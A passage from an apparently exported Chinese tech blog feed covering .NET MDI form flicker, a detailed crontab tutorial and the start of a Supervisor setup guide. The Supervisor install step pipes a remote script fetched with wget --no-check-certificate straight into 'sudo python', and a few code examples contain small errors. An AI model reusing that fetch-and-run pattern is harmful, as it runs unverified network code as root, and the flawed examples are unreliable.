class="line"><span class="comment">/* 禁止窗体中的绘制操作 */</span></span><br><span class="line">frmChild1.Hide();</span><br><span class="line">SendMessage( <span class="keyword">this</span>.Handle, WM_SETDRAW, <span class="keyword">false</span>, <span class="keyword">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 显示窗体等其他需要再显示前做的事 */</span></span><br><span class="line">frmChild2.Show();</span><br><span class="line">SendMessage( <span class="keyword">this</span>.Handle, WM_SETDRAW, <span class="keyword">true</span>, <span class="keyword">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 解除禁止绘制操作 */</span></span><br><span class="line">RedrawWindow( <span class="keyword">this</span>.Handle, IntPtr.Zero, IntPtr.Zero, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN );    <span class="comment">/* (0x04 | 0x01 | 0x80)立即强制重绘父窗体及其所有子窗 */</span></span><br></pre></td></tr></table></figure>

<p>SendMessage函数中，发送消息 WM_SETREDRAW，设置SETREDRAW为FALSE，导致窗口不进行绘制。</p>
<p>此时，看到的窗体是假的，现象：鼠标形状是后面应用程序的形状；鼠标划过，后面的应用程序就显示出来了。人眼看到的就是“花屏”。</p>
]]></content>
      <categories>
        <category>.NET</category>
      </categories>
      <tags>
        <tag>MDI窗体闪烁</tag>
        <tag>SendMessage</tag>
      </tags>
  </entry>
  <entry>
    <title>crontab命令</title>
    <url>/articles/crontab%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。</p>
<h3 id="一、crond简介"><a href="#一、crond简介" class="headerlink" title="一、crond简介"></a>一、crond简介</h3><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
<p>Linux下的任务调度分为两类，系统任务调度和用户任务调度。</p>
<ul>
<li>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。</li>
</ul>
<p>/etc/crontab文件包括下面几行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]# cat /etc/crontab</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of job definition:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  |</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> *  *  *  *  * user-name  <span class="built_in">command</span> to be executed</span></span><br></pre></td></tr></table></figure>

<p>前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。剩下部分的含义将在下个小节详细讲述， 这里不在多说。</p>
<ul>
<li>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。</li>
</ul>
<p>使用者权限文件：</p>
<table>
<thead>
<tr>
<th align="left">文件</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/etc/cron.deny</td>
<td align="left">该文件中所列用户不允许使用crontab命令</td>
</tr>
<tr>
<td align="left">/etc/cron.allow</td>
<td align="left">该文件中所列用户允许使用crontab命令</td>
</tr>
<tr>
<td align="left">/var/spool/cron</td>
<td align="left">所有用户crontab文件存放的目录,以用户名命名</td>
</tr>
</tbody></table>
<p>crontab文件的含义：用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：</p>
<p>minute   hour   day   month   week   command</p>
<p>其中：</p>
<p><code>minute</code>： 表示分钟，可以是从0到59之间的任何整数。</p>
<p><code>hour</code>：表示小时，可以是从0到23之间的任何整数。</p>
<p><code>day</code>：表示日期，可以是从1到31之间的任何整数。</p>
<p><code>month</code>：表示月份，可以是从1到12之间的任何整数。</p>
<p><code>week</code>：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
<p><code>command</code>：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
<p><img src="/articles/crontab命令/crontab.png" alt="crontab"></p>
<p>在以上各个字段中，还可以使用以下特殊字符：</p>
<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
<h3 id="二、crond服务"><a href="#二、crond服务" class="headerlink" title="二、crond服务"></a>二、crond服务</h3><p>安装crontab：</p>
<p><code>yum install crontabs</code></p>
<p>服务操作说明：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">/sbin/service crond start   // 启动服务</span><br><span class="line"></span><br><span class="line">/sbin/service crond stop    // 关闭服务</span><br><span class="line"></span><br><span class="line">/sbin/service crond restart // 重启服务</span><br><span class="line"></span><br><span class="line">/sbin/service crond reload  // 重新载入配置</span><br></pre></td></tr></table></figure>

<p>查看crontab服务状态：</p>
<p><code>service crond status</code></p>
<p>手动启动crontab服务：</p>
<p><code>service crond start</code></p>
<p>查看crontab服务是否已设置为开机启动，执行命令：</p>
<p><code>ntsysv</code></p>
<p>加入开机自动启动：</p>
<p><code>chkconfig –level 35 crond on</code></p>
<h3 id="三、crontab命令详解"><a href="#三、crontab命令详解" class="headerlink" title="三、crontab命令详解"></a>三、crontab命令详解</h3><h4 id="3-1-命令格式"><a href="#3-1-命令格式" class="headerlink" title="3.1 命令格式"></a>3.1 命令格式</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab [-u user] file</span><br><span class="line"></span><br><span class="line">crontab [-u user] [ -e | -l | -r ]</span><br></pre></td></tr></table></figure>

<h4 id="3-2-命令功能"><a href="#3-2-命令功能" class="headerlink" title="3.2 命令功能"></a>3.2 命令功能</h4><p>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。</p>
<h4 id="3-3-命令参数"><a href="#3-3-命令参数" class="headerlink" title="3.3 命令参数"></a>3.3 命令参数</h4><p><code>-u user</code>：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。</p>
<p><code>file</code>：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</p>
<p><code>-e</code>：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</p>
<p><code>-l</code>：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</p>
<p><code>-r</code>：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</p>
<p><code>-i</code>：在删除用户的crontab文件时给确认提示。</p>
<h4 id="3-4-常用方法"><a href="#3-4-常用方法" class="headerlink" title="3.4 常用方法"></a>3.4 常用方法</h4><h5 id="1-创建一个新的crontab文件"><a href="#1-创建一个新的crontab文件" class="headerlink" title="1. 创建一个新的crontab文件"></a>1. 创建一个新的crontab文件</h5><p>在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的. profile文件，在其中加入这样一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EDITOR=vi; export EDITOR</span><br></pre></td></tr></table></figure>

<p>然后保存并退出。不妨创建一个名为&lt;user&gt; cron的文件，其中&lt;user&gt;是用户名，例如， davecron。在该文件中加入如下的内容。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> (put your own initials here)<span class="built_in">echo</span> the date to the console every</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 15minutes between 6pm and 6am</span></span><br><span class="line"></span><br><span class="line">0,15,30,45 18-06 * * * /bin/echo 'date' &gt; /dev/console</span><br></pre></td></tr></table></figure>

<p>保存并退出。<code>确信前面5个域用空格分隔</code></p>
<p>在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> crontab davecron</span></span><br></pre></td></tr></table></figure>

<p>现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。</p>
<p>同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。</p>
<h5 id="2-列出crontab文件"><a href="#2-列出crontab文件" class="headerlink" title="2. 列出crontab文件"></a>2. 列出crontab文件</h5><p>为了列出crontab文件，可以用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> crontab -l</span></span><br><span class="line"></span><br><span class="line">0,15,30,45,18-06 * * * /bin/echo `date` &gt; dev/tty1</span><br></pre></td></tr></table></figure>

<p>你将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> crontab -l &gt; <span class="variable">$HOME</span>/mycron</span></span><br></pre></td></tr></table></figure>

<p>这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。</p>
<h5 id="3-编辑crontab文件"><a href="#3-编辑crontab文件" class="headerlink" title="3. 编辑crontab文件"></a>3. 编辑crontab文件</h5><p>如果希望添加、删除或编辑crontab文件中的条目，而E D I TO R环境变量又设置为v i，那么就可以用v i来编辑crontab文件，相应的命令为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> crontab -e</span></span><br></pre></td></tr></table></figure>

<p>可以像使用v i编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。</p>
<p>我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</span></span><br><span class="line"></span><br><span class="line">30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。</p>
<p>现在让我们使用前面讲过的crontab -l命令列出它的全部信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab -l</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> (crondave installed on Tue May 4 13:07:43 1999)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> DT:ech the date to the console every 30 minites</span></span><br><span class="line"></span><br><span class="line">0,15,30,45 18-06 * * * /bin/echo `date` &gt; /dev/tty1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</span></span><br><span class="line"></span><br><span class="line">30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h5 id="4-删除crontab文件"><a href="#4-删除crontab文件" class="headerlink" title="4. 删除crontab文件"></a>4. 删除crontab文件</h5><p>要删除crontab文件，可以用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab -r</span></span><br></pre></td></tr></table></figure>

<h5 id="5-恢复丢失的crontab文件"><a href="#5-恢复丢失的crontab文件" class="headerlink" title="5. 恢复丢失的crontab文件"></a>5. 恢复丢失的crontab文件</h5><p>如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/&lt;username&gt;，其中&lt;username&gt;是用户名。如果由于权限问题无法完成拷贝，可以用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab \&lt;filename\&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，&lt;filename&gt;是你在$ H O M E目录中副本的文件名。</p>
<p>建议你在自己的$ H O M E目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。</p>
<p>有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按&lt;Ctrl-D&gt;，否则你将丢失crontab文件。</p>
<h4 id="3-5-使用实例"><a href="#3-5-使用实例" class="headerlink" title="3.5 使用实例"></a>3.5 使用实例</h4><h5 id="实例1：每1分钟执行一次command"><a href="#实例1：每1分钟执行一次command" class="headerlink" title="实例1：每1分钟执行一次command"></a>实例1：每1分钟执行一次command</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * * command</span><br></pre></td></tr></table></figure>

<h5 id="实例2：每小时的第3和第15分钟执行"><a href="#实例2：每小时的第3和第15分钟执行" class="headerlink" title="实例2：每小时的第3和第15分钟执行"></a>实例2：每小时的第3和第15分钟执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3,15 * * * * command</span><br></pre></td></tr></table></figure>

<h5 id="实例3：在上午8点到11点的第3和第15分钟执行"><a href="#实例3：在上午8点到11点的第3和第15分钟执行" class="headerlink" title="实例3：在上午8点到11点的第3和第15分钟执行"></a>实例3：在上午8点到11点的第3和第15分钟执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3,15 8-11 * * * command</span><br></pre></td></tr></table></figure>

<h5 id="实例4：每隔两天的上午8点到11点的第3和第15分钟执行"><a href="#实例4：每隔两天的上午8点到11点的第3和第15分钟执行" class="headerlink" title="实例4：每隔两天的上午8点到11点的第3和第15分钟执行"></a>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3,15 8-11 */2 * * command</span><br></pre></td></tr></table></figure>

<h5 id="实例5：每个星期一的上午8点到11点的第3和第15分钟执行"><a href="#实例5：每个星期一的上午8点到11点的第3和第15分钟执行" class="headerlink" title="实例5：每个星期一的上午8点到11点的第3和第15分钟执行"></a>实例5：每个星期一的上午8点到11点的第3和第15分钟执行</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3,15 8-11 * * 1 command</span><br></pre></td></tr></table></figure>

<h5 id="实例6：每晚的21-30重启smb"><a href="#实例6：每晚的21-30重启smb" class="headerlink" title="实例6：每晚的21:30重启smb"></a>实例6：每晚的21:30重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">30 21 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例7：每月1、10、22日的4-45重启smb"><a href="#实例7：每月1、10、22日的4-45重启smb" class="headerlink" title="实例7：每月1、10、22日的4 : 45重启smb"></a>实例7：每月1、10、22日的4 : 45重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例8：每周六、周日的1-10重启smb"><a href="#实例8：每周六、周日的1-10重启smb" class="headerlink" title="实例8：每周六、周日的1 : 10重启smb"></a>实例8：每周六、周日的1 : 10重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10 1 * * 6,0 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例9：每天18-00至23-00之间每隔30分钟重启smb"><a href="#实例9：每天18-00至23-00之间每隔30分钟重启smb" class="headerlink" title="实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb"></a>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0,30 18-23 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例10：每星期六的晚上11-00-pm重启smb"><a href="#实例10：每星期六的晚上11-00-pm重启smb" class="headerlink" title="实例10：每星期六的晚上11 : 00 pm重启smb"></a>实例10：每星期六的晚上11 : 00 pm重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例11：每一小时重启smb"><a href="#实例11：每一小时重启smb" class="headerlink" title="实例11：每一小时重启smb"></a>实例11：每一小时重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* */1 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例12：晚上11点到早上7点之间，每隔一小时重启smb"><a href="#实例12：晚上11点到早上7点之间，每隔一小时重启smb" class="headerlink" title="实例12：晚上11点到早上7点之间，每隔一小时重启smb"></a>实例12：晚上11点到早上7点之间，每隔一小时重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* 23-7/1 * * * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例13：每月的4号与每周一到周三的11点重启smb"><a href="#实例13：每月的4号与每周一到周三的11点重启smb" class="headerlink" title="实例13：每月的4号与每周一到周三的11点重启smb"></a>实例13：每月的4号与每周一到周三的11点重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 11 4 * mon-wed /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例14：一月一号的4点重启smb"><a href="#实例14：一月一号的4点重启smb" class="headerlink" title="实例14：一月一号的4点重启smb"></a>实例14：一月一号的4点重启smb</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 4 1 jan * /etc/init.d/smb restart</span><br></pre></td></tr></table></figure>

<h5 id="实例15：每小时执行-etc-cron-hourly目录内的脚本"><a href="#实例15：每小时执行-etc-cron-hourly目录内的脚本" class="headerlink" title="实例15：每小时执行/etc/cron.hourly目录内的脚本"></a>实例15：每小时执行/etc/cron.hourly目录内的脚本</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">01   *   *   *   *     root run-parts /etc/cron.hourly</span><br></pre></td></tr></table></figure>

<p><code>注意</code>：如果去掉run-parts 这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了</p>
<h3 id="四、使用注意事项"><a href="#四、使用注意事项" class="headerlink" title="四、使用注意事项"></a>四、使用注意事项</h3><h4 id="4-1-注意环境变量问题"><a href="#4-1-注意环境变量问题" class="headerlink" title="4.1 注意环境变量问题"></a>4.1 注意环境变量问题</h4><p>有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。</p>
<p>在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。</p>
<p>不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点：</p>
<ul>
<li><p>脚本中涉及文件路径时写全局路径；</p>
</li>
<li><p>脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat start_cbp.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line"></span><br><span class="line">export RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf</span><br><span class="line"></span><br><span class="line">/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 * * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh</span><br></pre></td></tr></table></figure>

<h4 id="4-2-注意清理系统用户的邮件日志"><a href="#4-2-注意清理系统用户的邮件日志" class="headerlink" title="4.2 注意清理系统用户的邮件日志"></a>4.2 注意清理系统用户的邮件日志</h4><p>每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。</p>
<p>例如，可以在crontab文件中设置如下形式，忽略日志输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>/dev/null 2&gt;&amp;1</code> 表示先将标准输出重定向到 /dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。</p>
<h4 id="4-3-系统级任务调度与用户级任务调度"><a href="#4-3-系统级任务调度与用户级任务调度" class="headerlink" title="4.3 系统级任务调度与用户级任务调度"></a>4.3 系统级任务调度与用户级任务调度</h4><p>系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。</p>
<h4 id="4-4-其他注意事项"><a href="#4-4-其他注意事项" class="headerlink" title="4.4 其他注意事项"></a>4.4 其他注意事项</h4><p>新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</p>
<p>当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。</p>
<p>千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。</p>
<p>在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+%Y%m%d’。</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Supervisor进行管理工具</title>
    <url>/articles/Supervisor%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>Supervisor（<a href="http://supervisord.org/" target="_blank" rel="noopener">http://supervisord.org/</a>）是用Python开发的一个client/server服务，是Linux/Unix系统下的一个进程管理工具，不支持Windows系统。它可以很方便的监听、启动、停止、重启一个或多个进程。用Supervisor管理的进程，当一个进程意外被杀死，supervisort监听到进程死后，会自动将它重新拉起，很方便的做到进程自动恢复的功能，不再需要自己写shell脚本来控制。</p>
<p>因为Supervisor是Python开发的，安装前先检查一下系统否安装了Python2.4以上版本。下面以CentOS7，Python2.7版本环境下，介绍Supervisor的安装与配置步聚：</p>
<p>1、安装Python包管理工具 （<a href="https://pypi.python.org/pypi/setuptools" target="_blank" rel="noopener">easy_install</a>）easy_install是setuptools包里带的一个命令，使用easy_install实际上是在调用setuptools来完成安装模块的工作,所以安装setuptools即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate &#123;url:https://bootstrap.pypa.io/ez_setup.py&#125; -O - | sudo python</span><br></pre></td></tr></table></figure>

<p>2、安装supervisoreasy_install supervisor</p>
<p>supervisor安装完成后会生成三个执行程序：supervisortd、supervisorctl、echo_supervisord_conf，分别是supervisor的守护进程服务（用于接收进程管理命令）、客户端（用于和守护进程通信，发送管理进程的指令）、生成初始配置文件程序。</p>
<p>3、配置</p>
<p>运行supervisord服务的时候，需要指定supervisor配置文件，如果没有显示指定，默认在以下目录查找：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">CWD/supervisord.conf</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">CWD/etc/supervisord.conf</span></span><br><span class="line"></span><br><span class="line">/etc/supervisord.conf</span><br><span class="line"></span><br><span class="line">/etc/supervisor/supervisord.conf (since Supervisor 3.3.0)</span><br><span class="line"></span><br><span class="line">../etc/supervisord.conf (Relative to the executable)</span><br><span class="line"></span><br><span class="line">../supervisord.conf (Relative to the executable)</span><br></pre></td></tr></table></figure>

<p>$CWD表示运行supervisord程序的目录。</p>
<p>可以通过运行echo_supervisord_conf程序生成supervisor的初始化配置文件，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /etc/supervisor</span><br><span class="line"></span><br><span class="line">echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure>

<p>4、配置文件参数说明</p>
<p>supervisor的配置参数较多，下面介绍一下常用的参数配置，详细的配置及说明，请参考<a href="http://supervisord.org/configuration.html" target="_blank" rel="noopener">官方文档</a>介绍。</p>
<p>注：分号（;）开头的配置表示注释</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/tmp/supervisor.sock   ;UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">;chmod=0700                 ;socket文件的mode，默认是0700</span><br><span class="line">;chown=nobody:nogroup       ;socket文件的owner，格式：uid:gid</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ;HTTP服务器，提供web管理界面</span><br><span class="line">;port=127.0.0.1:9001        ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username=user              ;登录管理后台的用户名</span><br><span class="line">;password=123               ;登录管理后台的密码</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.log</span><br><span class="line">logfile_maxbytes=50MB        ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小</span><br><span class="line">logfile_backups=10           ;日志文件保留备份数量默认10，设为0表示不备份</span><br><span class="line">loglevel=info                ;日志级别，默认info，其它: debug,warn,trace</span><br><span class="line">pidfile=/tmp/supervisord.pid ;pid 文件</span><br><span class="line">nodaemon=false               ;是否在前台启动，默认是false，即以 daemon 的方式启动</span><br><span class="line">minfds=1024                  ;可以打开的文件描述符的最小值，默认 1024</span><br><span class="line">minprocs=200                 ;可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line">serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致</span><br><span class="line">;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord</span><br><span class="line"></span><br><span class="line">; [program:xx]是被管理的进程配置参数，xx是进程的名称</span><br><span class="line">[program:xx]</span><br><span class="line">command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run  ; 程序启动命令</span><br><span class="line">autostart=true       ; 在supervisord启动的时候也自动启动</span><br><span class="line">startsecs=10         ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒</span><br><span class="line">autorestart=true     ; 